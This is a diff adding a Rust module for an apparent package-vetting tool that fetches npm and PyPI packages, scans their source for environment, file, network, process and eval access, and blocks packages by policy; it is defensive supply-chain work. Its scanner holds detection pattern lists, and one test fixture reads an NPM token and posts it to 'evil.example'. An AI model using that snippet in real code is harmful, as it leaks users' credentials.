@@ -1,0 +1,1120 @@
+use std::collections::{BTreeMap, BTreeSet};
+use std::fmt;
+use std::fs;
+use std::io::{Cursor, Read};
+use std::path::{Path, PathBuf};
+use std::str::FromStr;
+
+use flate2::read::GzDecoder;
+use omc_cap::{Capability, Policy};
+use omc_format::{BehaviorType, CapOp, Function, HttpRequest, Module, Op, Value, VirtualPath};
+use omc_verify::{verify_module, VerifyFinding};
+use reqwest::blocking::Client;
+use serde::{Deserialize, Serialize};
+use sha2::{Digest, Sha256};
+use tar::Archive;
+use thiserror::Error;
+
+pub type Result<T> = std::result::Result<T, OmcRegistryError>;
+
+const LOCKFILE: &str = "omc.lock";
+const MANIFEST: &str = "omc.toml";
+const ARTIFACT_SCHEMA: u32 = 1;
+const MAX_FILE_BYTES: u64 = 2 * 1024 * 1024;
+
+#[derive(Debug, Error)]
+pub enum OmcRegistryError {
+    #[error("unsupported package spec `{0}`")]
+    UnsupportedSpec(String),
+    #[error("package version was not found: {0}")]
+    PackageNotFound(String),
+    #[error("blocked package `{spec}`; use --record-blocked to keep the artifact and lock entry")]
+    BlockedPackage { spec: String },
+    #[error("registry response did not include a downloadable artifact for {0}")]
+    MissingArtifact(String),
+    #[error("downloaded artifact digest mismatch for {name}: expected {expected}, got {actual}")]
+    DigestMismatch {
+        name: String,
+        expected: String,
+        actual: String,
+    },
+    #[error("http error: {0}")]
+    Http(#[from] reqwest::Error),
+    #[error("io error: {0}")]
+    Io(#[from] std::io::Error),
+    #[error("json error: {0}")]
+    Json(#[from] serde_json::Error),
+    #[error("toml decode error: {0}")]
+    TomlDecode(#[from] toml::de::Error),
+    #[error("toml encode error: {0}")]
+    TomlEncode(#[from] toml::ser::Error),
+    #[error("zip error: {0}")]
+    Zip(#[from] zip::result::ZipError),
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
+#[serde(rename_all = "lowercase")]
+pub enum Ecosystem {
+    Npm,
+    Pypi,
+}
+
+impl fmt::Display for Ecosystem {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        match self {
+            Self::Npm => f.write_str("npm"),
+            Self::Pypi => f.write_str("pypi"),
+        }
+    }
+}
+
+impl FromStr for Ecosystem {
+    type Err = OmcRegistryError;
+
+    fn from_str(value: &str) -> Result<Self> {
+        match value {
+            "npm" => Ok(Self::Npm),
+            "pypi" | "py" | "python" => Ok(Self::Pypi),
+            _ => Err(OmcRegistryError::UnsupportedSpec(value.to_owned())),
+        }
+    }
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct PackageSpec {
+    pub ecosystem: Ecosystem,
+    pub name: String,
+    pub version: Option<String>,
+}
+
+impl PackageSpec {
+    pub fn parse(raw: &str) -> Result<Self> {
+        let (ecosystem, rest) = raw
+            .split_once(':')
+            .ok_or_else(|| OmcRegistryError::UnsupportedSpec(raw.to_owned()))?;
+        let ecosystem = Ecosystem::from_str(ecosystem)?;
+
+        match ecosystem {
+            Ecosystem::Npm => parse_npm_spec(raw, rest),
+            Ecosystem::Pypi => parse_pypi_spec(rest),
+        }
+    }
+
+    pub fn package_key(&self) -> String {
+        format!("{}:{}", self.ecosystem, self.name)
+    }
+
+    pub fn requested(&self) -> String {
+        match &self.version {
+            Some(version) => format!("{}:{}@{}", self.ecosystem, self.name, version),
+            None => self.package_key(),
+        }
+    }
+}
+
+fn parse_npm_spec(raw: &str, rest: &str) -> Result<PackageSpec> {
+    if rest.is_empty() {
+        return Err(OmcRegistryError::UnsupportedSpec(raw.to_owned()));
+    }
+
+    let version_at = if let Some(stripped) = rest.strip_prefix('@') {
+        stripped.rfind('@').map(|index| index + 1)
+    } else {
+        rest.rfind('@')
+    };
+
+    let (name, version) = match version_at {
+        Some(index) => (&rest[..index], Some(rest[index + 1..].to_owned())),
+        None => (rest, None),
+    };
+
+    if name.is_empty() || version.as_deref() == Some("") {
+        return Err(OmcRegistryError::UnsupportedSpec(raw.to_owned()));
+    }
+
+    Ok(PackageSpec {
+        ecosystem: Ecosystem::Npm,
+        name: name.to_owned(),
+        version,
+    })
+}
+
+fn parse_pypi_spec(rest: &str) -> Result<PackageSpec> {
+    let (name, version) = if let Some((name, version)) = rest.split_once("==") {
+        (name, Some(version.to_owned()))
+    } else if let Some((name, version)) = rest.rsplit_once('@') {
+        (name, Some(version.to_owned()))
+    } else {
+        (rest, None)
+    };
+
+    if name.is_empty() || version.as_deref() == Some("") {
+        return Err(OmcRegistryError::UnsupportedSpec(rest.to_owned()));
+    }
+
+    Ok(PackageSpec {
+        ecosystem: Ecosystem::Pypi,
+        name: name.to_owned(),
+        version,
+    })
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct OmcManifest {
+    pub project: ProjectInfo,
+    #[serde(default)]
+    pub dependencies: BTreeMap<String, String>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ProjectInfo {
+    pub name: String,
+    pub version: String,
+}
+
+impl OmcManifest {
+    pub fn new(name: impl Into<String>) -> Self {
+        Self {
+            project: ProjectInfo {
+                name: name.into(),
+                version: "0.1.0".to_owned(),
+            },
+            dependencies: BTreeMap::new(),
+        }
+    }
+}
+
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct OmcLock {
+    pub version: u32,
+    #[serde(default)]
+    pub packages: Vec<LockedPackage>,
+}
+
+impl OmcLock {
+    pub fn new() -> Self {
+        Self {
+            version: 1,
+            packages: Vec::new(),
+        }
+    }
+
+    fn upsert(&mut self, package: LockedPackage) {
+        if let Some(existing) = self.packages.iter_mut().find(|entry| {
+            entry.ecosystem == package.ecosystem
+                && entry.name == package.name
+                && entry.version == package.version
+        }) {
+            *existing = package;
+        } else {
+            self.packages.push(package);
+            self.packages.sort_by(|left, right| {
+                (
+                    left.ecosystem,
+                    left.name.as_str(),
+                    left.version.as_str(),
+                    left.sha256.as_str(),
+                )
+                    .cmp(&(
+                        right.ecosystem,
+                        right.name.as_str(),
+                        right.version.as_str(),
+                        right.sha256.as_str(),
+                    ))
+            });
+        }
+    }
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct LockedPackage {
+    pub ecosystem: Ecosystem,
+    pub name: String,
+    pub version: String,
+    pub source_url: String,
+    pub archive: String,
+    pub artifact: String,
+    pub sha256: String,
+    pub behavior: Behavior,
+    pub verdict: Verdict,
+    #[serde(default)]
+    pub grants: Vec<String>,
+    #[serde(default)]
+    pub capabilities: Vec<CapabilityFinding>,
+    #[serde(default)]
+    pub verifier_findings: Vec<String>,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "lowercase")]
+pub enum Behavior {
+    Pure,
+    HostCapability,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "lowercase")]
+pub enum Verdict {
+    Accepted,
+    Blocked,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
+pub struct CapabilityFinding {
+    pub kind: CapabilityKind,
+    pub target: String,
+    pub source: String,
+    pub evidence: String,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum CapabilityKind {
+    EnvRead,
+    FsRead,
+    FsWrite,
+    HttpRequest,
+    ProcSpawn,
+    DynamicEval,
+}
+
+impl fmt::Display for CapabilityKind {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        match self {
+            Self::EnvRead => f.write_str("env_read"),
+            Self::FsRead => f.write_str("fs_read"),
+            Self::FsWrite => f.write_str("fs_write"),
+            Self::HttpRequest => f.write_str("http_request"),
+            Self::ProcSpawn => f.write_str("proc_spawn"),
+            Self::DynamicEval => f.write_str("dynamic_eval"),
+        }
+    }
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct OmcArtifact {
+    pub schema: u32,
+    pub package: ArtifactPackage,
+    pub source_url: String,
+    pub source_sha256: String,
+    pub compiler: String,
+    pub behavior: Behavior,
+    pub verdict: Verdict,
+    pub grants: Vec<String>,
+    pub files_scanned: usize,
+    pub capabilities: Vec<CapabilityFinding>,
+    pub verifier_findings: Vec<String>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ArtifactPackage {
+    pub ecosystem: Ecosystem,
+    pub name: String,
+    pub version: String,
+}
+
+#[derive(Debug, Clone)]
+pub struct LinkOptions {
+    pub project_dir: PathBuf,
+    pub record_blocked: bool,
+    pub allowed_capabilities: Vec<Capability>,
+}
+
+impl LinkOptions {
+    pub fn new(project_dir: impl Into<PathBuf>) -> Self {
+        Self {
+            project_dir: project_dir.into(),
+            record_blocked: false,
+            allowed_capabilities: Vec::new(),
+        }
+    }
+}
+
+#[derive(Debug, Clone)]
+pub struct LinkReport {
+    pub locked: LockedPackage,
+    pub artifact: OmcArtifact,
+    pub lockfile: PathBuf,
+    pub manifest: PathBuf,
+}
+
+#[derive(Debug, Clone)]
+struct ResolvedPackage {
+    ecosystem: Ecosystem,
+    name: String,
+    version: String,
+    source_url: String,
+    filename: String,
+    expected_sha256: Option<String>,
+    npm_scripts: BTreeMap<String, String>,
+}
+
+pub fn init_project(project_dir: impl AsRef<Path>, name: Option<&str>) -> Result<PathBuf> {
+    let project_dir = project_dir.as_ref();
+    fs::create_dir_all(project_dir.join(".omc"))?;
+
+    let manifest_path = project_dir.join(MANIFEST);
+    if !manifest_path.exists() {
+        let project_name = name.map(str::to_owned).unwrap_or_else(|| {
+            project_dir
+                .file_name()
+                .and_then(|name| name.to_str())
+                .unwrap_or("omc-project")
+                .to_owned()
+        });
+        let manifest = OmcManifest::new(project_name);
+        fs::write(&manifest_path, toml::to_string_pretty(&manifest)?)?;
+    }
+
+    let lockfile_path = project_dir.join(LOCKFILE);
+    if !lockfile_path.exists() {
+        fs::write(&lockfile_path, toml::to_string_pretty(&OmcLock::new())?)?;
+    }
+
+    Ok(manifest_path)
+}
+
+pub fn link_package(spec: &PackageSpec, options: &LinkOptions) -> Result<LinkReport> {
+    init_project(&options.project_dir, None)?;
+
+    let client = Client::builder().user_agent("omc-prototype/0.1").build()?;
+    let resolved = resolve_package(&client, spec)?;
+    let archive_bytes = download_artifact(&client, &resolved)?;
+    let sha256 = sha256_hex(&archive_bytes);
+
+    if let Some(expected) = &resolved.expected_sha256 {
+        if !expected.eq_ignore_ascii_case(&sha256) {
+            return Err(OmcRegistryError::DigestMismatch {
+                name: resolved.name.clone(),
+                expected: expected.clone(),
+                actual: sha256,
+            });
+        }
+    }
+
+    let archive_path = cache_archive(&options.project_dir, &resolved, &sha256, &archive_bytes)?;
+    let profile = profile_archive(&resolved, &archive_bytes)?;
+    let module = module_from_profile(&resolved, &profile.capabilities);
+    let policy = options
+        .allowed_capabilities
+        .iter()
+        .cloned()
+        .fold(Policy::pure(), Policy::allow_capability);
+    let verification = verify_module(&module, &policy);
+    let verifier_findings = verification
+        .err()
+        .map(|error| {
+            error
+                .findings
+                .into_iter()
+                .map(render_verify_finding)
+                .collect::<Vec<_>>()
+        })
+        .unwrap_or_default();
+    let verdict = if verifier_findings.is_empty() {
+        Verdict::Accepted
+    } else {
+        Verdict::Blocked
+    };
+    let behavior = if profile.capabilities.is_empty() {
+        Behavior::Pure
+    } else {
+        Behavior::HostCapability
+    };
+
+    let artifact = OmcArtifact {
+        schema: ARTIFACT_SCHEMA,
+        package: ArtifactPackage {
+            ecosystem: resolved.ecosystem,
+            name: resolved.name.clone(),
+            version: resolved.version.clone(),
+        },
+        source_url: resolved.source_url.clone(),
+        source_sha256: sha256.clone(),
+        compiler: "omc-prototype-source-profiler".to_owned(),
+        behavior,
+        verdict,
+        grants: options
+            .allowed_capabilities
+            .iter()
+            .map(ToString::to_string)
+            .collect(),
+        files_scanned: profile.files_scanned,
+        capabilities: profile.capabilities,
+        verifier_findings: verifier_findings.clone(),
+    };
+    let artifact_path = write_artifact(&options.project_dir, &resolved, &artifact)?;
+
+    let locked = LockedPackage {
+        ecosystem: resolved.ecosystem,
+        name: resolved.name.clone(),
+        version: resolved.version.clone(),
+        source_url: resolved.source_url.clone(),
+        archive: relative_path(&options.project_dir, &archive_path),
+        artifact: relative_path(&options.project_dir, &artifact_path),
+        sha256,
+        behavior,
+        verdict,
+        grants: artifact.grants.clone(),
+        capabilities: artifact.capabilities.clone(),
+        verifier_findings,
+    };
+
+    if locked.verdict == Verdict::Blocked && !options.record_blocked {
+        return Err(OmcRegistryError::BlockedPackage {
+            spec: spec.requested(),
+        });
+    }
+
+    let manifest_path = options.project_dir.join(MANIFEST);
+    let mut manifest = read_manifest(&manifest_path)?;
+    manifest
+        .dependencies
+        .insert(spec.package_key(), resolved.version.clone());
+    fs::write(&manifest_path, toml::to_string_pretty(&manifest)?)?;
+
+    let lockfile = options.project_dir.join(LOCKFILE);
+    let mut lock = read_lockfile(&lockfile)?;
+    lock.upsert(locked.clone());
+    fs::write(&lockfile, toml::to_string_pretty(&lock)?)?;
+
+    Ok(LinkReport {
+        locked,
+        artifact,
+        lockfile,
+        manifest: manifest_path,
+    })
+}
+
+pub fn read_lockfile(path: impl AsRef<Path>) -> Result<OmcLock> {
+    let path = path.as_ref();
+    if !path.exists() {
+        return Ok(OmcLock::new());
+    }
+    Ok(toml::from_str(&fs::read_to_string(path)?)?)
+}
+
+pub fn read_manifest(path: impl AsRef<Path>) -> Result<OmcManifest> {
+    let path = path.as_ref();
+    if !path.exists() {
+        return Ok(OmcManifest::new("omc-project"));
+    }
+    Ok(toml::from_str(&fs::read_to_string(path)?)?)
+}
+
+pub fn parse_capability_grant(value: &str) -> Result<Capability> {
+    if value == "dynamic-eval" || value == "dynamic.eval" {
+        return Ok(Capability::DynamicEval);
+    }
+    if value == "time.now" || value == "time" {
+        return Ok(Capability::TimeNow);
+    }
+    if value == "random.bytes" || value == "random" {
+        return Ok(Capability::RandomBytes);
+    }
+
+    let (kind, target) = value
+        .split_once(':')
+        .ok_or_else(|| OmcRegistryError::UnsupportedSpec(value.to_owned()))?;
+    let target = target.to_owned();
+
+    match kind {
+        "env" | "env.read" | "env-read" => Ok(Capability::EnvRead(target)),
+        "fs.read" | "fs-read" => Ok(Capability::FsRead(target)),
+        "fs.write" | "fs-write" => Ok(Capability::FsWrite(target)),
+        "http" | "network" => Ok(Capability::HttpHost(target)),
+        "dns" => Ok(Capability::DnsHost(target)),
+        "proc" | "proc.spawn" | "proc-spawn" => Ok(Capability::ProcSpawn(target)),
+        _ => Err(OmcRegistryError::UnsupportedSpec(value.to_owned())),
+    }
+}
+
+fn resolve_package(client: &Client, spec: &PackageSpec) -> Result<ResolvedPackage> {
+    match spec.ecosystem {
+        Ecosystem::Npm => resolve_npm(client, spec),
+        Ecosystem::Pypi => resolve_pypi(client, spec),
+    }
+}
+
+fn resolve_npm(client: &Client, spec: &PackageSpec) -> Result<ResolvedPackage> {
+    let encoded = urlencoding::encode(&spec.name);
+    let version = match &spec.version {
+        Some(version) => version.clone(),
+        None => {
+            let url = format!("https://registry.npmjs.org/{encoded}");
+            let root = client
+                .get(url)
+                .send()?
+                .error_for_status()?
+                .json::<NpmRoot>()?;
+            root.dist_tags.latest
+        }
+    };
+    let url = format!("https://registry.npmjs.org/{encoded}/{version}");
+    let response = client.get(url).send()?;
+    if response.status().as_u16() == 404 {
+        return Err(OmcRegistryError::PackageNotFound(spec.requested()));
+    }
+    let version_doc = response.error_for_status()?.json::<NpmVersion>()?;
+    let filename = version_doc
+        .dist
+        .tarball
+        .rsplit('/')
+        .next()
+        .unwrap_or("package.tgz")
+        .to_owned();
+
+    Ok(ResolvedPackage {
+        ecosystem: Ecosystem::Npm,
+        name: version_doc.name,
+        version: version_doc.version,
+        source_url: version_doc.dist.tarball,
+        filename,
+        expected_sha256: None,
+        npm_scripts: version_doc.scripts.unwrap_or_default(),
+    })
+}
+
+fn resolve_pypi(client: &Client, spec: &PackageSpec) -> Result<ResolvedPackage> {
+    let encoded = urlencoding::encode(&spec.name);
+    let url = match &spec.version {
+        Some(version) => format!("https://pypi.org/pypi/{encoded}/{version}/json"),
+        None => format!("https://pypi.org/pypi/{encoded}/json"),
+    };
+    let response = client.get(url).send()?;
+    if response.status().as_u16() == 404 {
+        return Err(OmcRegistryError::PackageNotFound(spec.requested()));
+    }
+    let doc = response.error_for_status()?.json::<PypiResponse>()?;
+    let file = choose_pypi_file(&doc)
+        .ok_or_else(|| OmcRegistryError::MissingArtifact(spec.requested()))?;
+    let source_url = file.url.clone();
+    let filename = file.filename.clone();
+    let expected_sha256 = file.digests.sha256.clone();
+
+    Ok(ResolvedPackage {
+        ecosystem: Ecosystem::Pypi,
+        name: doc.info.name,
+        version: doc.info.version,
+        source_url,
+        filename,
+        expected_sha256: Some(expected_sha256),
+        npm_scripts: BTreeMap::new(),
+    })
+}
+
+fn choose_pypi_file(doc: &PypiResponse) -> Option<&PypiFile> {
+    doc.urls
+        .iter()
+        .find(|file| file.packagetype == "sdist")
+        .or_else(|| {
+            doc.urls
+                .iter()
+                .find(|file| file.packagetype == "bdist_wheel")
+        })
+        .or_else(|| doc.urls.first())
+}
+
+fn download_artifact(client: &Client, package: &ResolvedPackage) -> Result<Vec<u8>> {
+    Ok(client
+        .get(&package.source_url)
+        .send()?
+        .error_for_status()?
+        .bytes()?
+        .to_vec())
+}
+
+fn cache_archive(
+    project_dir: &Path,
+    package: &ResolvedPackage,
+    sha256: &str,
+    bytes: &[u8],
+) -> Result<PathBuf> {
+    let cache_dir = project_dir
+        .join(".omc")
+        .join("cache")
+        .join(package.ecosystem.to_string())
+        .join(safe_name(&package.name))
+        .join(&package.version);
+    fs::create_dir_all(&cache_dir)?;
+
+    let extension = archive_extension(&package.filename);
+    let archive_path = cache_dir.join(format!("{sha256}.{extension}"));
+    if !archive_path.exists() {
+        fs::write(&archive_path, bytes)?;
+    }
+    Ok(archive_path)
+}
+
+fn write_artifact(
+    project_dir: &Path,
+    package: &ResolvedPackage,
+    artifact: &OmcArtifact,
+) -> Result<PathBuf> {
+    let artifact_dir = project_dir
+        .join(".omc")
+        .join("artifacts")
+        .join(package.ecosystem.to_string())
+        .join(safe_name(&package.name))
+        .join(&package.version);
+    fs::create_dir_all(&artifact_dir)?;
+
+    let artifact_path = artifact_dir.join("omc.json");
+    fs::write(&artifact_path, serde_json::to_string_pretty(artifact)?)?;
+    Ok(artifact_path)
+}
+
+#[derive(Debug, Clone)]
+struct ArchiveProfile {
+    files_scanned: usize,
+    capabilities: Vec<CapabilityFinding>,
+}
+
+fn profile_archive(package: &ResolvedPackage, bytes: &[u8]) -> Result<ArchiveProfile> {
+    let mut profiler = SourceProfiler::default();
+
+    for (name, script) in &package.npm_scripts {
+        if is_npm_lifecycle_script(name) {
+            profiler.add(
+                CapabilityKind::ProcSpawn,
+                format!("npm-script:{name}"),
+                "package.json",
+                format!("lifecycle script `{name}` = `{script}`"),
+            );
+        }
+    }
+
+    if package.filename.ends_with(".tgz") || package.filename.ends_with(".tar.gz") {
+        let decoder = GzDecoder::new(Cursor::new(bytes));
+        let mut archive = Archive::new(decoder);
+        for entry in archive.entries()? {
+            let mut entry = entry?;
+            if !entry.header().entry_type().is_file() || entry.size() > MAX_FILE_BYTES {
+                continue;
+            }
+            let path = entry.path()?.to_string_lossy().into_owned();
+            let mut content = String::new();
+            entry.read_to_string(&mut content).ok();
+            profiler.scan_file(&path, &content);
+        }
+    } else if package.filename.ends_with(".whl") || package.filename.ends_with(".zip") {
+        let reader = Cursor::new(bytes);
+        let mut archive = zip::ZipArchive::new(reader)?;
+        for index in 0..archive.len() {
+            let mut file = archive.by_index(index)?;
+            if file.is_dir() || file.size() > MAX_FILE_BYTES {
+                continue;
+            }
+            let path = file.name().to_owned();
+            let mut content = String::new();
+            file.read_to_string(&mut content).ok();
+            profiler.scan_file(&path, &content);
+        }
+    } else {
+        let content = String::from_utf8_lossy(bytes);
+        profiler.scan_file(&package.filename, &content);
+    }
+
+    Ok(profiler.finish())
+}
+
+#[derive(Debug, Default)]
+struct SourceProfiler {
+    files_scanned: usize,
+    findings: BTreeSet<CapabilityFinding>,
+}
+
+impl SourceProfiler {
+    fn scan_file(&mut self, path: &str, content: &str) {
+        if !is_source_like(path) || is_ignored_source_path(path) || content.is_empty() {
+            return;
+        }
+
+        self.files_scanned += 1;
+        let lower = content.to_ascii_lowercase();
+
+        for pattern in ["process.env", "os.environ", "getenv("] {
+            if lower.contains(pattern) {
+                self.add(CapabilityKind::EnvRead, "*", path, pattern);
+            }
+        }
+
+        for pattern in [
+            "readfilesync",
+            "readfile(",
+            "createreadstream",
+            "require(\"fs\")",
+            "require('fs')",
+            "open(",
+        ] {
+            if lower.contains(pattern) {
+                self.add(CapabilityKind::FsRead, "*", path, pattern);
+            }
+        }
+
+        for pattern in [
+            "writefilesync",
+            "writefile(",
+            "createwritestream",
+            ".write(",
+        ] {
+            if lower.contains(pattern) {
+                self.add(CapabilityKind::FsWrite, "*", path, pattern);
+            }
+        }
+
+        for pattern in [
+            "fetch(",
+            "require(\"http\")",
+            "require('http')",
+            "require(\"https\")",
+            "require('https')",
+            "axios",
+            "requests.",
+            "urllib.request",
+            "httpx.",
+            "socket.",
+        ] {
+            if lower.contains(pattern) {
+                self.add(CapabilityKind::HttpRequest, "*", path, pattern);
+            }
+        }
+
+        for pattern in [
+            "child_process",
+            "subprocess",
+            "os.system",
+            "popen(",
+            "spawn(",
+            "execfile(",
+        ] {
+            if lower.contains(pattern) {
+                self.add(CapabilityKind::ProcSpawn, "*", path, pattern);
+            }
+        }
+
+        for pattern in ["eval(", "new function", "exec("] {
+            if lower.contains(pattern) {
+                self.add(CapabilityKind::DynamicEval, "*", path, pattern);
+            }
+        }
+    }
+
+    fn add(
+        &mut self,
+        kind: CapabilityKind,
+        target: impl Into<String>,
+        source: impl Into<String>,
+        evidence: impl Into<String>,
+    ) {
+        self.findings.insert(CapabilityFinding {
+            kind,
+            target: target.into(),
+            source: source.into(),
+            evidence: evidence.into(),
+        });
+    }
+
+    fn finish(self) -> ArchiveProfile {
+        ArchiveProfile {
+            files_scanned: self.files_scanned,
+            capabilities: self.findings.into_iter().collect(),
+        }
+    }
+}
+
+fn module_from_profile(package: &ResolvedPackage, capabilities: &[CapabilityFinding]) -> Module {
+    let behavior = if capabilities.is_empty() {
+        BehaviorType::Pure
+    } else {
+        BehaviorType::HostCapability
+    };
+    let mut code = Vec::new();
+    for finding in capabilities {
+        code.push(Op::Cap(cap_op_from_finding(finding)));
+    }
+    code.push(Op::Const(Value::Unit));
+    code.push(Op::Return);
+
+    Module {
+        id: format!("{}:{}@{}", package.ecosystem, package.name, package.version),
+        package: package.name.clone(),
+        version: package.version.clone(),
+        declared_behavior: behavior,
+        functions: vec![Function::new(0, "package_init", 0, code)],
+    }
+}
+
+fn cap_op_from_finding(finding: &CapabilityFinding) -> CapOp {
+    match finding.kind {
+        CapabilityKind::EnvRead => CapOp::EnvRead {
+            name: finding.target.clone(),
+        },
+        CapabilityKind::FsRead => CapOp::FsRead {
+            path: VirtualPath(finding.target.clone()),
+        },
+        CapabilityKind::FsWrite => CapOp::FsWrite {
+            path: VirtualPath(finding.target.clone()),
+            value_from_stack: false,
+        },
+        CapabilityKind::HttpRequest => CapOp::HttpRequest {
+            request: HttpRequest {
+                method: "POST".to_owned(),
+                url: "omc://observed-network".to_owned(),
+                host: finding.target.clone(),
+                body_from_stack: false,
+            },
+        },
+        CapabilityKind::ProcSpawn => CapOp::ProcSpawn {
+            command: finding.target.clone(),
+            args: Vec::new(),
+        },
+        CapabilityKind::DynamicEval => CapOp::DynamicEval {
+            source_from_stack: false,
+        },
+    }
+}
+
+fn render_verify_finding(finding: VerifyFinding) -> String {
+    format!(
+        "{}[{}]: {}",
+        finding.function, finding.instruction, finding.message
+    )
+}
+
+fn is_npm_lifecycle_script(name: &str) -> bool {
+    matches!(
+        name,
+        "preinstall"
+            | "install"
+            | "postinstall"
+            | "prepare"
+            | "prepublish"
+            | "prepack"
+            | "postpack"
+    )
+}
+
+fn is_source_like(path: &str) -> bool {
+    let path = path.to_ascii_lowercase();
+    let file_name = Path::new(&path)
+        .file_name()
+        .and_then(|name| name.to_str())
+        .unwrap_or_default();
+
+    if matches!(
+        file_name,
+        "package.json"
+            | "package-lock.json"
+            | "npm-shrinkwrap.json"
+            | "setup.py"
+            | "conftest.py"
+            | "tox.ini"
+            | "noxfile.py"
+            | "pyproject.toml"
+            | "setup.cfg"
+    ) {
+        return false;
+    }
+
+    matches!(
+        Path::new(&path).extension().and_then(|ext| ext.to_str()),
+        Some("js" | "mjs" | "cjs" | "ts" | "tsx" | "jsx" | "py" | "json" | "toml" | "cfg" | "ini")
+    )
+}
+
+fn is_ignored_source_path(path: &str) -> bool {
+    path.split('/').any(|component| {
+        matches!(
+            component.to_ascii_lowercase().as_str(),
+            "test"
+                | "tests"
+                | "__tests__"
+                | "docs"
+                | "doc"
+                | "examples"
+                | "example"
+                | "benchmark"
+                | "benchmarks"
+                | "perf"
+                | "performance"
+        )
+    })
+}
+
+fn sha256_hex(bytes: &[u8]) -> String {
+    let mut digest = Sha256::new();
+    digest.update(bytes);
+    hex::encode(digest.finalize())
+}
+
+fn archive_extension(filename: &str) -> &'static str {
+    if filename.ends_with(".tar.gz") || filename.ends_with(".tgz") {
+        "tgz"
+    } else if filename.ends_with(".whl") {
+        "whl"
+    } else if filename.ends_with(".zip") {
+        "zip"
+    } else {
+        "archive"
+    }
+}
+
+fn safe_name(name: &str) -> String {
+    name.replace('/', "__")
+}
+
+fn relative_path(base: &Path, path: &Path) -> String {
+    path.strip_prefix(base)
+        .unwrap_or(path)
+        .to_string_lossy()
+        .replace('\\', "/")
+}
+
+#[derive(Debug, Deserialize)]
+struct NpmRoot {
+    #[serde(rename = "dist-tags")]
+    dist_tags: NpmDistTags,
+}
+
+#[derive(Debug, Deserialize)]
+struct NpmDistTags {
+    latest: String,
+}
+
+#[derive(Debug, Deserialize)]
+struct NpmVersion {
+    name: String,
+    version: String,
+    dist: NpmDist,
+    #[serde(default)]
+    scripts: Option<BTreeMap<String, String>>,
+}
+
+#[derive(Debug, Deserialize)]
+struct NpmDist {
+    tarball: String,
+}
+
+#[derive(Debug, Deserialize)]
+struct PypiResponse {
+    info: PypiInfo,
+    urls: Vec<PypiFile>,
+}
+
+#[derive(Debug, Deserialize)]
+struct PypiInfo {
+    name: String,
+    version: String,
+}
+
+#[derive(Debug, Deserialize)]
+struct PypiFile {
+    filename: String,
+    packagetype: String,
+    url: String,
+    digests: PypiDigests,
+}
+
+#[derive(Debug, Deserialize)]
+struct PypiDigests {
+    sha256: String,
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn parses_npm_specs() {
+        let spec = PackageSpec::parse("npm:left-pad@1.3.0").unwrap();
+        assert_eq!(spec.ecosystem, Ecosystem::Npm);
+        assert_eq!(spec.name, "left-pad");
+        assert_eq!(spec.version.as_deref(), Some("1.3.0"));
+
+        let spec = PackageSpec::parse("npm:@scope/pkg@2.0.0").unwrap();
+        assert_eq!(spec.name, "@scope/pkg");
+        assert_eq!(spec.version.as_deref(), Some("2.0.0"));
+    }
+
+    #[test]
+    fn parses_pypi_specs() {
+        let spec = PackageSpec::parse("pypi:requests==2.32.3").unwrap();
+        assert_eq!(spec.ecosystem, Ecosystem::Pypi);
+        assert_eq!(spec.name, "requests");
+        assert_eq!(spec.version.as_deref(), Some("2.32.3"));
+
+        let spec = PackageSpec::parse("pypi:six@1.16.0").unwrap();
+        assert_eq!(spec.name, "six");
+        assert_eq!(spec.version.as_deref(), Some("1.16.0"));
+    }
+
+    #[test]
+    fn profiler_turns_host_access_into_capabilities() {
+        let mut profiler = SourceProfiler::default();
+        profiler.scan_file(
+            "index.js",
+            "const token = process.env.NPM_TOKEN; fetch('https://evil.example', { body: token });",
+        );
+        let profile = profiler.finish();
+        assert!(profile
+            .capabilities
+            .iter()
+            .any(|finding| finding.kind == CapabilityKind::EnvRead));
+        assert!(profile
+            .capabilities
+            .iter()
+            .any(|finding| finding.kind == CapabilityKind::HttpRequest));
+    }
+
+    #[test]
+    fn profiler_ignores_tests_and_packaging_files() {
+        let mut profiler = SourceProfiler::default();
+        profiler.scan_file("pkg/tests/test_runtime.py", "open('/tmp/x', 'w')");
+        profiler.scan_file("pkg/setup.py", "open('README.md').read()");
+        let profile = profiler.finish();
+        assert!(profile.capabilities.is_empty());
+        assert_eq!(profile.files_scanned, 0);
+    }
+
+    #[test]
+    fn parses_capability_grants() {
+        assert_eq!(
+            parse_capability_grant("http:api.example.com").unwrap(),
+            Capability::HttpHost("api.example.com".to_owned())
+        );
+        assert_eq!(
+            parse_capability_grant("env:API_TOKEN").unwrap(),
+            Capability::EnvRead("API_TOKEN".to_owned())
+        );
+        assert_eq!(
+            parse_capability_grant("dynamic-eval").unwrap(),
+            Capability::DynamicEval
+        );
+    }
+
+    #[test]
+    fn generated_profile_module_rejects_capabilities_by_default() {
+        let package = ResolvedPackage {
+            ecosystem: Ecosystem::Npm,
+            name: "date-helper".to_owned(),
+            version: "1.2.4".to_owned(),
+            source_url: "https://example.invalid/date-helper.tgz".to_owned(),
+            filename: "date-helper.tgz".to_owned(),
+            expected_sha256: None,
+            npm_scripts: BTreeMap::new(),
+        };
+        let findings = vec![CapabilityFinding {
+            kind: CapabilityKind::EnvRead,
+            target: "NPM_TOKEN".to_owned(),
+            source: "index.js".to_owned(),
+            evidence: "process.env".to_owned(),
+        }];
+        let module = module_from_profile(&package, &findings);
+        let error = verify_module(&module, &Policy::pure()).unwrap_err();
+        assert!(error
+            .findings
